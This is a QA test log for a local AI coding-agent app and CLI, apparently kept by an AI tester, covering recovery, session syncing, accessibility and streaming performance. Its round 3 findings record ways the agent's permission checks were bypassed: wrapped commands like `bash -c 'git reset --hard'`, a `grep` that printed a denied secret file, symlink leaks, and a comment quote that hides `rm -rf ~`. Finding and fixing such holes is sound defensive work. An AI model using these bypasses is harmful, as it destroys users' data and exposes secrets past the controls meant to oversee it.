Test projects in the scratchpad: `calc`, `parts`, and `Prüf ordner` (space + ü, a stdio MCP mock in `.mcp.json`, a
UserPromptSubmit hook) with a symlink `link-pruef` to it. Test instances launched with `open -n` (later `-g`), stopped
by pid; quits by pid through `NSRunningApplication.terminate()` (a real Quit, not a signal).

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 16.0 | pass | Installed app (`/Applications`, Release of 0397ba0) launched beside nothing else with `KURTKODE_AUTOSEND` set: nothing sent (no hooks in Release). By computer use: New Chat, `/model google/gemma-4-26b-a4b-qat` (the default, qwen3-coder-30b, isn't loaded; the composer offered "Load with 128k context", not pressed), a two-line question → "13 and 17" and a highlighted Python block, "Thought for 473 tokens", 511 tokens at 49 tok/s | |
| 16.1 | pass | CLI (bang): (a) `kill -9` while `sleep 25` ran in bash: the file ends with the assistant's tool call (whole line); `-c` sent it as "Error: this tool call was interrupted before it ran." and the model said so. (b) `kill -9` 4 s into `/compact`: no compaction record, nothing torn; `-c` → `/compact` "about 5k tokens down to 2k", then answered. (c) `kill -9` during `!sleep 20`: nothing recorded; `-c` → `!echo after-kill` recorded and used. Torn line appended by hand → `-c -p` ran, the next record started on a new line, only the torn line unreadable. App (Debug): the same three (a: reopened card shows "?" "This call never ran", a follow-up ran; b: killed 4 s into a 12 s `/compact`, no record, rerun compacted 8065 → 2422; c: `!sleep 20` killed, nothing recorded, `!echo app-after-kill` worked); no duplicated ids (6 messages, 6 unique) | **F8**: the cut-off call is described as "interrupted before it ran" / "This call never ran" although it was running (the model is misinformed; with an edit or a non-idempotent command that matters). The killed process's children (`sleep`) keep running after `kill -9` (expected for SIGKILL; see F12 for a clean quit) |
| 16.2 | partial | One `Pru_f_ordner-ea1b12b1` group for `/private/tmp/…/Prüf ordner` (NFC), `/tmp/…` (NFC), trailing slash, NFD, `/tmp/…` NFD + slash; MCP approved once (interactive CLI) and never asked again under any spelling, the app included; project hook approved once, ran in all 7 sessions; sandboxed `touch made-N.txt` worked under every spelling (`--sandbox always`, and the app in Full Auto via the symlink + trailing slash); `--add-dir <symlink>/` and `--read-dir /tmp/…` stored canonical, write allowed / denied; the app's sidebar shows all 7 sessions in one group (16.2-sidebar.png) | **F9 (CLI)**: a project opened **through a symlink** gets its own session folder (`link-pruef-104b5aef`, header workspace `/tmp/…/link-pruef`): `CLISession.init` names new sessions and filters `-c`/`-r` by `workspace.standardizedFileURL` (no symlink resolution), while `--list-sessions`, MCP, hooks and the app use the canonical path. So from the link `--list-sessions` lists the real folder's sessions but `-c` continues the link's; from the real path `-c` never sees the link's session |
| 16.3 | pass | Debug app, Ask mode, bang, all by AXPress/AXSetValue in the background: **Allow** → ran, `decider: user`, waited 1339 s (the card sat while the soak ran); **Deny with feedback** (typed into the card's field) → result "The user denied this bash call and said: Don't use bash… Use the list_dir tool instead.", the model called `list_dir`; record `allowed: false`, `detail` = the feedback, waited 8.4 s; **Always allow commands starting with "echo"** → `detail: always allow commands starting with "echo"`; the next `echo always-2` ran with no card, `decider: rule`; **two parallel writer subagents** (Qwen made both `task` calls in one reply): one card at a time, labelled "[general subagent] Write notes_b.txt", the other run "waiting for a free slot…"; the second card came only after the first run ended (waits 10.2 s, 18.4 s, both `decider: user`); files A and B written; results in call order | The rule is listed only inside the permission-mode pop-up ("Always allowed this session", with Remove); opening it needs full-screen control, so it wasn't looked at. Rules last for the session only |
| 16.4 | partial | Swept with `app_screenshot` + `app_ax_find`: main window (sidebar, toolbar, transcript, tool cards, approval card, composer), inspector tabs, Agents tab, Debug window (Timeline, turn tabs, Journal), Settings (Generation, Sandbox, Endpoints, MCP), Models window, menus. **Reachable**: approval card (Allow / Always allow / Deny / feedback field), tool cards, "Thought for N tokens" disclosures, code-block Copy, inspector tabs (Todos, Changes, Agents, Git, Context as radio buttons), Open in Debug, Debug mode and turn tabs, Replay…, Copy as cURL, filter toggles, MCP Restart, Settings tabs, Models Load/Unload, menu bar | **F15**, the list (worst first): (1) Settings controls have **no accessible names**: the pop-ups, switches, steppers and text fields in Generation, Sandbox and Endpoints are announced as just "pop-up button" / "switch" (their labels are separate texts); (2) composer buttons are named by their images: "Arrow Up Circle" (send), "stop.circle.fill" (stop), and the attach button is "Attachements" (misspelled); (3) the toolbar's context meter ("2.4k / 67k") and memory readout ("33% free") aren't in the accessibility tree; (4) Debug Timeline rows can be selected only with a real click (no AXSelected/press action on the rows); the Tool and Context-lens pop-ups and the Journal search field are unnamed; the budget chart's bars (click to set the lens) aren't reachable; icons read as symbol names ("brain", "arrow.turn.down.right"); (5) repeated controls with the same name: every Agents-tab card's "Open in Debug", every Models row's "Load" and "Context"; (6) the Window menu lists Models and Debug twice. (The tool cards' own labels were withheld by the computer-use tool, so they weren't judged.) |
| 16.5 | partial | App (one launch per case, calc, `smock.py`): 401 → "Server returned HTTP 401: No auth credentials found"; 403 → "Server returned HTTP 403: Key limit exceeded (total limit). Manage it using https://openrouter.ai/settings/keys" with a Retry link (16.5-full2-crop.png); 429 (Retry-After 1) then 200 → 2 requests, reply shown; 500 → readable error, 1 request (not retried, by design: `isTransient` leaves out 500, LM Studio template errors); server gone before answering → "The network connection was lost." CLI `-p`: the same messages on stderr with exit 1, `"error"` in `--output json`; 429 → exit 0 | **F10**: a stream cut mid-reply (a chunk, then the connection closes: no `finish_reason`, no `[DONE]`) is saved as a **completed** reply holding the partial text (app: shown as a normal answer, 16.5-case5-crop.png; CLI: exit 0, `result` = the partial text). `ChatClient.stream` finishes normally when the byte stream ends. A partial tool call would be parsed and run the same way |
| 16.6 | fail | Debug app showing session 01043AAB (bang), its Debug window following it; `kurtkode -c -p 'cli-turn: remember the word Porcupine77…'` from the CLI → its records appended cleanly after the app's (no interleaving, nothing lost, file valid). Then the app's queued message: "What word did I ask you to remember in the cli-turn message?" → **UNKNOWN**: its request held only app-1, Ready, app-2 | **F11**: the app never reloads a session another process appended to: the main window and the Debug window (Timeline: 1 turn) don't show the CLI's turn, nothing says the file changed, and the app's next request omits it. The file now holds a history neither side sent as a whole |
| 16.7 | partial | Quit by pid (real Quit) during: an approval wait (Ask mode: card "awaiting approval" → reopened: card with "?" "This call never ran", composer free — true here); a `/compact` ("Summarizing…" → reopened: no record, no spinner; 16.7b-pair.png); a background report wait (Agents tab after reopening: "Cut off (no end recorded) · 2 turns · 2 calls", 16.7d-inspector.png); a `!sleep 30` | Nothing stuck "running" anywhere. **F12**: a clean Quit leaves the `!command`'s process running (`sleep 30` still there after the app exited); only MCP stdio servers are stopped at quit (`StdioTransport.terminateAll`); a bash tool run is presumably the same. The cut-off `!command` leaves no trace in the session. The reopened chat doesn't say the background report will never come (only the Agents tab does). Side note: a test instance launched with `open -n` took focus and got one of the user's keystrokes ("U" in its composer); later launches use `open -g` |
| 16.8 | partial | `Prüf ordner`, Full Auto, bang: `mcp__mock__crash` → error result "The server exited (status 3): mock server starting / fatal: crashing on purpose"; the next `echo` → the same error; the model reported both. Settings → MCP → **Restart** (computer use, AXPress) → server process back; a new message → `echo` "after-restart" | **F13**: after the crash, Settings → MCP still showed a green dot and "Running (mock 1.0) · 8 tools" (screenshots right after and 5 s later); the hub doesn't move a server whose process exited to failed. The second call's error repeats the first's stderr instead of saying the server is down |
| 16.9 | pass | `kurtkode-eval --no-load` long-doc × 4 on Gemma: **3/4 pass** (1.00, 1.00, 1.00; trial 1 0.64), mean 493 s, 3–5 compactions each, no errors, min free RAM 25–27%. `eval-results/s7-f1-longdoc.json` and transcripts | No reply was only a tool-call marker in any trial, so the F1 path wasn't exercised (no regression either). Trial 1 failed by stopping early: after 9 of 14 files the reply was "The next step is to continue documenting the remaining files" with an unfinished todo list and no tool call, and the loop took it as the answer (**O1** below) |
| 16.10 | fail | `build/PerfDD` rebuilt from HEAD; 10 launches, each a plain chat streaming 60 KB of Markdown (headings, lists, code, tables) from `mock_stream_server.py` at 110 tok/s; hang log of that pid; `sample` on each stall ≥ 1 s. Runs 1–5, 8, 10: at most 380 ms (runs 3, 8, 10 none ≥ 250 ms). **Run 6**: 1083 ms; **run 7**: 2495 ms; **run 9**: first 400 ms, then from 126 s into the stream 1680, 1284, 1796 ms … 295 stalls (63 ≥ 1 s, max 2813 ms) and the reply took 419 s instead of ~176 | **F14**: every sample's main thread is in SwiftUI text layout of the streaming message (`ViewGraph` update → `TextLayoutQuery` → `ResolvedStyledText.TextLayoutManager` layout/metrics), with our frames `ChatView.transcript` (ChatView.swift:187, the `proxy.scrollTo("bottom")` after each growth), Textual's `TextFragment` and `StructuredText.TableLayout`: the whole growing message is laid out again on updates, and late in a long reply that costs over a second. My sampler made run 9 worse (each 3 s `sample` slows the app, which logs more stalls, which started more samples: 65 samples); its first stall wasn't caused by it. Runs 6–7 overlapped the 16.9 eval (Gemma on the GPU, 25–27% RAM free); run 9 didn't. Round 1's three clean 60 KB runs and its one unexplained 17.4 s stall fit the same picture: rare, load-dependent, and now with a stack. The first soak attempt (two streams per chat) also showed that the second message compacted the first 60 KB reply through the mock (a summary request that streams 60 KB): a test artifact, not a bug |

### Round 2 summary

| Result | Tests |
|---|---|
| pass | 16.0, 16.1, 16.3, 16.9 |
| partial | 16.2 (F9), 16.4 (F15), 16.5 (F10), 16.7 (F12), 16.8 (F13) |
| fail | 16.6 (F11), 16.10 (F14) |

### Round 2 findings and fix options

| # | Finding | Severity | Fix options (recommended first) |
|---|---|---|---|
| F10 | A stream cut mid-reply is a completed reply (app and CLI exit 0); a cut tool call would be run | high | (a) `ChatClient.stream`: when the bytes end without `[DONE]` and no choice had a `finish_reason`, throw "The connection closed before the reply finished"; the loop records the partial text with that error, and the turn can be retried like a lost reply (retry elsewhere / fallback). (b) only mark it and let the user retry |
| F11 | The app ignores records another process (the CLI) appends to an open session; its next request leaves them out | high | (a) before each send (and when a session window becomes key), compare the file's size with what the controller wrote; if it grew, reload the session (or, mid-run, refuse the send with "This session changed in another kurtkode; reload?"); the Debug window reloads the same way. (b) a file watcher (DispatchSource on the JSONL) that reloads idle sessions live. (c) an advisory lock so the CLI says "open in the app" and refuses `-c`. (a) first, (b) later if wanted; the CLI's interactive mode needs the same check |
| F14 | Long streamed Markdown replies stall the main thread (1–2.8 s) late in the stream: the whole message is laid out again | medium | (a) split a streaming reply's prose into finished blocks plus the open tail (finished ones keep their layout; only the tail changes), and throttle the follow-bottom `scrollTo` to once per second while streaming; measure with the soak (10 runs, one `sample` per burst). (b) render the streaming message as plain text and switch to Markdown when it ends. (c) only throttle `scrollTo` |
| F12 | Quitting the app leaves a running `!command` (and presumably a bash tool run) alive; the cut-off command leaves no trace | medium | (a) keep a registry of running process groups (bash tool, `!command`, hooks) and `killpg` them in `willTerminate` (as `StdioTransport.terminateAll` does for MCP); the CLI does the same on exit and SIGTERM/SIGHUP. (b) also record a "cut off by quit" note for the command |
| F13 | MCP status stays "Running" after the server process exits; later calls repeat the first error | medium | (a) in the hub, on the transport's termination handler, set the server's status to failed ("Exited (status 3): …") and drop its tools from the next request; later calls say "the MCP server mock isn't running (Restart in Settings → MCP)". (b) also offer automatic restart once |
| F9 | CLI: a project opened through a symlink gets its own session folder; `-c`/`-r` and `--list-sessions` disagree | low | (a) `CLISession.init`: use the canonical root (`self.root`) for the new header's workspace and the `-c`/`-r` filter (two lines), plus a test with a symlinked folder; old sessions stored under the link stay readable. (b) also match sessions by canonicalizing each stored workspace when filtering, so old link sessions join |
| F8 | A call cut off while running is described as "interrupted before it ran" (to the model) and "This call never ran" (card) | low | (a) wording: "Error: this tool call didn't finish (kurtkode stopped while it ran or before); its effects, if any, are unknown." and the card tooltip "No result recorded". (b) record a "started" note before running a call so the two cases can be told apart |
| F15 | Accessibility gaps (16.4's list) | medium for VoiceOver users | (a) names first: `accessibilityLabel` on composer send/stop/attach ("Send", "Stop", "Attach Images"), on the meter and memory readouts (as values), `LabeledContent`/labelled controls in Settings, model names in Models rows and run names in "Open in Debug"; Timeline rows as buttons or with a select action; label the Debug pop-ups and search field; the Window menu duplicates. (b) the chart's bars as an accessible list later |
| O1 | The loop accepts a final answer that says "the next step is to continue…" while the todo list has unfinished items (16.9 trial 1 stopped at 9/14) | low | (a) when a reply has no tool calls and the session's todo list has pending items, nudge once ("Your todo list still has N open items; continue, or say why you're stopping"), noted like the empty-reply nudge; check with long-doc trials. (b) leave it |
| O2 | Launch-only endpoints (`KURTKODE_EXTRA_ENDPOINT`, CLI `--endpoint`) get a new id each run and fill the shared `recentModels` with dead "mock" entries (10 after this run; restored); each `-c` with `--endpoint` writes a new `model` record | low | (a) don't add launch-only endpoints to `recentModels`. (b) give a launch-only endpoint a stable id from its URL |

Housekeeping: test sessions moved to `~/.Trash/kurtkode-test-s7-sessions` (4 project folders, 13 plain chats); the shared
defaults (incl. `showInspector` false, no `inspectorTab`, `recentModels`), `mcp-approvals.json`, `hook-approvals.json`
and `cli-history.jsonl` restored to their state before the session; no test instances or mock servers left running;
Gemma and the LAN Qwen untouched (no loads or unloads). Computer use: the background `app_*` tools reach only one
process per bundle id, so they picked the soak's PerfDD instance until it finished; test instances launched with
`open -n` take focus (one of the user's keystrokes landed in one), so `kk.sh` now uses `open -n -g`.

## Fixes after round 2 (2026-10-13, session 7)

The user accepted the recommended order (F10, F11, F12, F13, F9, F8, F15, F14, then O1, O2). Uncommitted until the
user says.

| # | Change | Check |
|---|---|---|
| F10 | `ChatClient.stream` throws `ChatError.streamCut` ("The connection closed before the reply finished; what arrived is kept, but it is incomplete.") when the bytes end with no `[DONE]` and no `finish_reason`; a finish reason without `[DONE]` still completes. The turn fails with its partial text, so a half-written tool call is never run | 2 tests; `smock.py drop`: CLI prints it on stderr, exit 1, `"error"` in JSON; the app shows it in red with Retry under the partial text |
| F11 | `SessionStore` remembers each file's size after its own reads and writes, and notices growth by another process (`changedElsewhere`); `ChatController` reloads an idle session before a send (a quick stat first; the send waits for the reload), after a run, when a window shows the session again, when the app becomes active, and on the Debug window's Reload, with a notice; a model on a server the app doesn't know stays as it was. The interactive CLI reloads before each message, `!command` and `/compact` | 2 tests (two stores on one folder; two CLI sessions); the 16.6 scenario again: the app's next request held the CLI's turn and answered "Porcupine77"; the Debug window showed 3 turns |
| F12 | `Subprocess` keeps the process groups it runs (bash tool calls, `!commands`); `RunningCommands.stopAll()` sends SIGTERM, then SIGKILL after 0.5 s; the app calls it at quit (with the MCP servers), the CLI at exit, SIGTERM and SIGHUP (MCP servers too, which it didn't stop before) | 1 test (a background child of the command dies too); app Quit during `!sleep 30` → gone; CLI SIGTERM during a bash `sleep 42` → gone (exit 143); a closed pty (SIGHUP) during `!sleep 41` → gone. Not done: a note on a cut-off `!command` |
| F13 | `MCPClient.onClosed`; the hub marks a ready server whose connection ended by itself as failed ("Stopped. The server exited (status 3): … / Restart it to use its tools again.") and drops its tools; later calls through a tool the run still holds say "The server isn't running any more (…)" | 1 test (crash → failed, no tools → restart → ready); the 16.8 scenario: red dot and the message in Settings → MCP |
| F9 | `CLISession` stores new sessions under the resolved folder and matches `-c`, `-r`, `--list-sessions` by resolving stored workspaces too (older sessions stored under a symlink's path join) | 1 test (symlinked project: one place, `-c` and the list agree from either spelling) |
| F8 | A call with no recorded result: "Error: no result was recorded for this tool call. kurtkode stopped before it ran or while it was running, so any effect it had is unknown; check before relying on it." (to the model); the card's "?" says "No result recorded: it was stopped before it ran or while it was running"; the Journal says "no result recorded for the call" | existing test updated |
| F15 | Names: composer Send / Stop / Attach Images; the context meter and memory readout are now buttons ("Context used" opens the inspector's Context tab; "Free memory" opens the Models window) with values; Models rows "Load/Reload/Unload <model>", "Context length for <model>"; Agents cards "Open <agent> run "<title>" in Debug" and "Stop …"; Journal lens picker, search field, match and lens arrows; the reasoning icon; the Window menu lists Models and Debug once (shortcuts on the scenes) | checked with computer use: Send, Attach Images, Context used, Free memory found by name; pressing Context used opened the Context tab; Window menu has one Models and one Debug. **Not changed**: the Settings controls are titled controls in a grouped Form, which macOS links to their labels (AXTitleUIElement); the computer-use summary shows only AXTitle, so 16.4's item (1) was most likely a false positive. Timeline row selection and the budget chart are left |
| F14 | `MarkdownSegments` also cuts prose before each heading at the start of a line; prose pieces are `Equatable` views (`ProseBlock`), so finished pieces aren't parsed or laid out again as the reply grows; following the bottom while a reply streams scrolls at most twice a second (a skipped scroll is put off, not dropped) | rendering of the 60 KB reply unchanged to the eye; **not fixed**: see the soak below |
| O1 | When this run wrote a todo list and a reply ends the run with items still open, the loop asks once ("Your todo list still has N open item(s) (next: "…"). If there's more to do, continue with it now. If you're stopping, update the list and say why the rest is left."); the reply stays and carries a note | 1 test (a todo list written in the run, one item open, asked once, the second answer ends the run) |
| O2 | `Endpoint.launchOnly(name:url:)`: a stable id from name and URL for the CLI's `--endpoint` and the app's `KURTKODE_EXTRA_ENDPOINT`; the app leaves that endpoint out of `recentModels`; the CLI writes no `model` record when `-m` names the session's own model | 1 test; three CLI runs with the same `--endpoint` (`-p`, `-c`, `-c`): one endpoint id, no `model` records (each `-c` added one before) |

New, found while fixing F14 (**F16**, not fixed): a long reply that streams fast (60 KB at the mock's top speed) ends
with the transcript short of the bottom (Section 37–41 of 56 shown), in the old build too; two extra scrolls after
the reply ended didn't help (taken out again). Likely the lazy stack's height estimate for the big final message.
At 110–400 tok/s the transcript follows while streaming.

### F14 measured: old and new, same soak, nothing else running

`spike/functest/soak.sh` (now takes `APP`, `RUNS`, `TAG`, `PORT`; one `sample` per run), 5 runs each of one 60 KB
Markdown reply at 110 tok/s; old = `build/PerfDD` (1826fe4), new = `build/PerfDD2` (these fixes, optimized with hooks).
No eval or builds running.

| Build | Run 1 | Run 2 | Run 3 | Run 4 | Run 5 |
|---|---|---|---|---|---|
| old | 357 ms | none | 271 ms | 269 ms | 349 ms |
| new | 251 ms | none | **169 stalls, 23 ≥ 1 s, max 6799 ms**, 227 s | none | 353 ms |

(Worst stall ≥ 250 ms per run; "none" = no stall that long.) The new build's run 3 stalled from 76 s into the stream until
it ended; its sample shows the same place as round 2's: the follow-bottom scroll (ChatView.swift:207 now) and Textual's
table layout (`StructuredText.TableLayout` under `tableBackground`/`tableOverlay`), plus `TextFragment`. With round 2's
soak, both builds have now had multi-second episodes (old: 3 of 10 runs in round 2, 0 of 5 here; new: 1 of 5), so the
episodes are intermittent and the change made no measurable difference. **F14 stays open.** The Equatable pieces and the
throttled follow are kept (no harm seen; fewer scrolls); say if they should go. Proposed next step: find what tips a run
into the bad mode, starting with the tables (the same soak with a reply without tables; then Textual's table background,
which builds a `TableLayout` from geometry, so every scroll may redo every table).

### F14: with and without tables (2026-10-13)

The same 60 KB reply, once with its 18 tables and once with each table's rows as a short list (61 KB); new build
(`build/PerfDD2`), alternating, 6 runs each, one launch per run; `soak.sh` now also logs the app's CPU time per run.

| Reply | Runs with a stall ≥ 1 s | Worst stall | Stalls ≥ 250 ms (sum) | App CPU per ~175 s stream |
|---|---|---|---|---|
| tables | 0 of 6 | 804 ms | 11 (4.3 s) | 1:53–1:59 (mean 115.7 s) |
| no tables | 1 of 6 | 1333 ms | 5 (2.5 s) | 1:42–1:46 (mean 104.0 s) |

No multi-second episode in any of the 12 runs, so the tables are neither confirmed nor ruled out as the trigger; a
1.3 s stall came without tables, so they aren't the only way in. Tables cost about 11% more CPU. The bigger finding:
**the app uses 100–120 s of CPU to show a 175 s stream** either way. A 5 s `sample` 90 s into a stream: the main thread
was busy 85% of the time (3095 of 3634 samples), 2193 of them in SwiftUI's graph update (`ViewGraphDelegate.updateGraph`),
829 in text layout (`TextLayoutQuery`/`ResolvedStyledText`), 784 in Core Animation commits and view layout; our own
frames are small (`ChatView.transcript` 52, `MarkdownView` 37, Textual tables ~40, `AttachmentOverlay` 88). So a
nearly saturated main thread is the setting in which any extra work (a big scroll, a table pass) becomes a
multi-second stall. Next: find which views SwiftUI re-lays out on each streaming update (Instruments' SwiftUI template,
or `Self._printChanges()` in the transcript's views in a Debug build), then cut those updates.

### F14 fixed (2026-10-13, later in session 7)

Method: the app's CPU time for one 30 KB stream at 220 tok/s (Debug build, ~45 s; repeats within ~1 s), and a new
Debug-only switch `KURTKODE_TRACE_BODIES=1` (launch with `open --stdout FILE`) that makes the main views print
`Self._printChanges()`, to see which bodies run per update.

What the trace showed: per update only `StreamingMessageView`, `MarkdownView` and the one growing `ProseBlock` ran
(~10/s); finished pieces' bodies didn't. `ChatView` re-ran every 3 s for `AppModel.memory` (small). So the cost was
layout, not bodies. Experiments (Debug, CPU for the 30 KB stream):

| Streaming reply drawn as | CPU |
|---|---|
| as committed in c447845 (pieces in one VStack) | 34.6 s |
| only the last piece (test switch) | 18.7 s |
| finished prose as plain `Text` (test switch) | 19.0 s |
| finished pieces in one `Equatable` container | 36.2 s |
| no follow-scrolling | 33.0 s |
| pieces in a `LazyVStack` inside the transcript's | 19.0 s, but pieces not drawn after a jump to the end |
| **each piece a row of the transcript's own `LazyVStack`** | **18.5 s** |
| finished pieces as one row + live piece + status (3 rows) | 30.2 s |

So Textual's layout of finished pieces was redone on every update (46% of the CPU), and only laziness avoided it.
The change (`MarkdownPieces`): a reply's Markdown is a list of views with no container, each piece a row of the
transcript's lazy stack, for streaming and finished replies alike (finished replies used one big view, and swapping
many rows for it left the transcript scrolled past its end: blank). Two more, found by sampling the soak's one
remaining episode: the whole reply was split again on every update (thousands of short-lived strings; on a
fragmented heap `free` took 11% of the main thread), now `MarkdownSplitCache` splits again from the last piece only
(checked against a full split on every prefix of three texts, two streams interleaved: all match); and updates slow
from 10/s to 4/s between 8 KB and 32 KB of reply. The follow-scroll uses `ScrollPosition.scrollTo(edge: .bottom)`.

Soak (optimized build with hooks, 60 KB reply with tables at 110 tok/s, one launch per run):

| Build | Runs with stalls ≥ 250 ms | Runs with a stall ≥ 1 s | App CPU per stream |
|---|---|---|---|
| before (round 2; first F14 attempt) | most | 1 in 5 (up to 6.8 s) | 112–119 s |
| pieces as rows | 1 of 5 | 1 of 5 (2.4 s) | 52–59 s |
| + slower updates for long replies | 1 of 5 | 1 of 5 (1.8 s) | 46–50 s |
| **+ incremental split** | **0 of 8** | **0 of 8** | **45–52 s** |

**F16 fixed too**: a long reply that finished fast now ends with the transcript at its bottom (the last code block and
the footer showing), where the old build stopped short; jumps to the middle and the top draw correctly.

Change in behavior: a reply's Copy / Retry appear when the pointer is over its footer line (was: anywhere on the reply).

Open (**F17**, seen while checking): screenshots taken in quick bursts during a stream show rows drawn twice or on top
of each other for a frame (a heading and its list twice, the status line inside a paragraph), in the build from
before today's work too, so not caused by these changes. It may be how `screencapture` catches a window mid-redraw;
nobody has reported seeing it. Worth a look with a screen recording.

### F17: not a bug (2026-10-13)

The "rows drawn twice or on top of each other" came from my contact sheets: screenshots taken a fraction of a second
apart, stacked into one image with no borders, so a heading in one tile and the same heading in the next looked like
one view showing it twice, and a status line at a tile's edge looked like it sat inside a paragraph. Checked frame by
frame with `spike/functest/ocrheadings.swift` (Vision OCR; flags a "Section N" heading that appears twice in one
frame): 0 of 24 single frames from the covered-window bursts, and 0 of 40 frames of a test window brought to the front
(with the user's OK) while a 60 KB reply streamed; a bordered contact sheet of the frontmost frames looks right. The
one single frame with list bullets but no text yet was of a covered window, which macOS doesn't fully redraw
(ScreenCaptureKit reported every frame of a covered window as "idle"). Consequence for F14: the per-piece rows design
(committed in aec2d05) was never at fault; the three-row variant was dropped for its CPU (30 s vs 18.5 s), which stands.
Lesson: put borders between tiles, and don't judge rendering from covered windows.

# Round 3 (2026-10-15)

Suite: FUNCTIONAL_TESTS.md §17. Build under test: HEAD 121560e (code as of b34a418): Debug app with hooks, Release app,
release CLI. Models: google/gemma-4-26b-a4b-qat on This Mac (64k, 1 slot, already loaded; not touched), MockServer for
the native APIs; no keyed calls. Two code reviews (safety/skills/ask_user; native APIs/costs/privacy) supplied leads,
each turned into a unit test before it was counted. Unit tests: `AgentCore/Tests/AgentCoreTests/Round3Tests.swift`
(34 tests; a bug shows as `withKnownIssue`, so the suite stays green: **320 tests pass with 50 known issues**). Test
sessions are in the Trash as `kurtkode-test-r3-*`; screenshots in the session scratchpad `r3/shots/`.

## 17B. End to end

| ID | Result | Evidence | Notes |
|---|---|---|---|
| 17B.0 | pass | 320 tests; Debug, Release, CLI build, no warnings (xcodebuild's destination notice only) | |
| 17B.1 | pass | `-p --mode auto`: fixed sub and mean, 3 tests OK; `-c` added mul + test, 4 OK; one `systemPrompt` record, the context note after the new message | |
| 17B.2 | pass | pty: y, a (always allow `cat`; the second `cat` ran unasked), deny with feedback (file kept), `/context`, `/mode plan` | in plan mode Gemma only read, so the refusal of a write wasn't exercised live (unit tests cover it) |
| 17B.3 | pass | explore subagent, 9 calls, correct answer (part1, 941); `--list-sessions`, `inspect` | |
| 17B.4 | pass | `inspect`/`export` on recorded Claude Opus and Gemini Flash sessions (copies from the Trash, nothing sent): cache lines, "Thought for 61 tokens; none of it shown" | |
| 17B.5 | pass | app, Ask + AUTOAPPROVE: fixed calc, tests OK. Parts demo at a 9k budget: 8 compactions, all 8 classes and counts right | |
| 17B.6 | **fail** | project deny `Read(./secrets.txt)` and `Bash(cat secrets.txt)` both held, then Gemma's `grep ".*"` printed the secret | R3-6 |
| 17B.7 | **fail** | `git reset --hard` refused in `-p --mode auto` with its reason; `bash -c 'git reset --hard'` ran and discarded the change | R3-5 |
| 17B.8 | pass | `/skills` (three, folders, "only when asked for"); `/counter calc.py` loaded the skill and ran its script in Full Auto (sandbox on) → 3; the hidden skill wasn't in the model's list; `/deploy` loaded it by name | |
| 17B.9 | fail (unit) | CRLF and BOM SKILL.md files are skipped; a CRLF command sends its front matter to the model | R3-1, R3-2 |
| 17B.10 | **partial** | numbers, `1,3` (multiple), empty line (asks again), Ctrl-D (no answer; Gemma assumed and said so) work. **Ctrl-C** stops the run but the prompt keeps reading: the next line typed (`/exit`) was swallowed as the answer | R3-27 |
| 17B.11 | partial | `-p`: no `ask_user` offered; Gemma asked in plain text and ended without deciding | R3-28: tell `-p` models nobody can answer |
| 17B.12 | pass | card on screen (17B12-card.png): question, three option buttons, text box, Send, Skip; quit while waiting, reopen: nothing stuck, the call marked "No result recorded" | R3-29: the composer stays active under the card |
| 17B.13 | pass | `--mode plan`: skill loaded, reads only, nothing written | |
| 17B.14 | pass | the app's session (ended mid-question) continued with `kurtkode -c`: one recorded prompt, the dangling call didn't break the request | |

## Findings, most severe first

Severity: **A** crash, data loss or a safety rule bypassed; **B** wrong behavior a user will hit; **C** minor or cosmetic.
"Unit" names the test in Round3Tests.swift that shows it.

| # | Sev | Finding | Shown by |
|---|---|---|---|
| R3-10 | A | `""` in a project's allow list: shown as the rule ".claude/settings.json" before approval, and **every run in the project crashes** (index out of range in `PermissionRules.load`) once approved | unit (the crash test is `.disabled` so it can't kill the run) |
| R3-5 | A | Deny rules and the destructive-command check miss wrapped or path-qualified commands: `bash -c '…'`, `sh -c`, `(…)`, `$(…)`, backticks, `/bin/rm`, `env X=1 rm` (deny rules), `command rm`, `nice`, `xargs rm`, `sudo rm` (deny rules) | unit + live 17B.7 |
| R3-3 | A | The command splitter treats `\"`, `\'` and an apostrophe in a comment (`# don't`) as an opening quote, so everything after it is one "part": `# don't worry⏎rm -rf ~` isn't flagged | unit |
| R3-8 | A | Any matching allow rule with a specifier turns off the danger check: `Bash(git:*)` or `Bash(git push:*)` (common in Claude Code settings) lets `git reset --hard` / `git push --force` run unasked in every mode | unit |
| R3-6 | A | A Read deny rule doesn't stop grep/glob over a folder that contains the file: `grep ".*"` prints it | unit + live 17B.6 |
| R3-20 | A | Withheld files leak through a symlink in grep (git projects): `config.txt -> .env` is searched and its secret sent | unit |
| R3-21 | B | A withheld folder pattern (`secrets/`, `secrets/*`) protects nothing nested | unit |
| R3-22 | B | Host names starting with `fd`/`fe80` (`fdai.example.com`) count as the local network, so nothing is withheld from them | unit |
| R3-24 | B | A declined (refusal) reply's tool calls still run | unit |
| R3-18 | B | Claude's ("prompt is too long") and Gemini's ("input token count … exceeds") overflow errors aren't recognized: no compact-and-retry, the run fails | unit |
| R3-19 | B | An `error` event inside a 200 stream (Anthropic `overloaded_error`) isn't retried; the run fails | unit |
| R3-25 | B | `pause_turn` (long server-side web search) ends the run as if answered | unit |
| R3-17 | B | A reply of only whitespace (Gemma's `"\n"` + tool calls) becomes a whitespace-only text block; switching that session to Claude gets HTTP 400 | unit |
| R3-23 | B | Repeated tool-call ids (Gemini 2.x sends none: every call is `call_0`) make an unanswered call look answered: no placeholder, an invalid request | unit |
| R3-15 | B | `ask_user` and `skill` are reads, so the duplicate-read check answers a repeated question ("You already called…") without asking, and refuses a skill reload after compaction | unit |
| R3-16 | B | The "same call three times" check isn't reset by reads in between: rerunning tests or polling asks in Full Auto, and `-p --mode auto` refuses | unit |
| R3-27 | B | CLI: Ctrl-C at a question (and presumably an approval) prompt doesn't end the read; the next line typed is taken as the answer | live 17B.10 |
| R3-26 | B | A turn cut off mid-stream records no usage though its input was billed (Gemini sends usage on every chunk): spending limits trigger late | unit |
| R3-1 | B | CRLF front matter isn't recognized: a CRLF skill is skipped; a CRLF command's description is "---" and its front matter is sent to the model | unit |
| R3-2 | C | A UTF-8 BOM hides the front matter (skill skipped) | unit |
| R3-11 | B | Read rules are case-sensitive on a case-insensitive disk (`.ENV`); `*` doesn't match dotfiles (`secrets/.key`) | unit |
| R3-7 | B | Relative paths that climb out (`rm -rf ./..`, `build/../..`) and `${HOME}/…` aren't caught | unit |
| R3-12 | C | Deletes inside read-only extra folders (skill folders) count as "inside the project" | unit |
| R3-9 | C | An ask rule on a read in plan mode refuses it ("isn't available in plan mode") instead of asking | unit |
| R3-13 | C | Danger false positives: `find . -delete` inside the project, `git restore -S` (= `--staged`), `rm --force ~/x.log` read as recursive | unit |
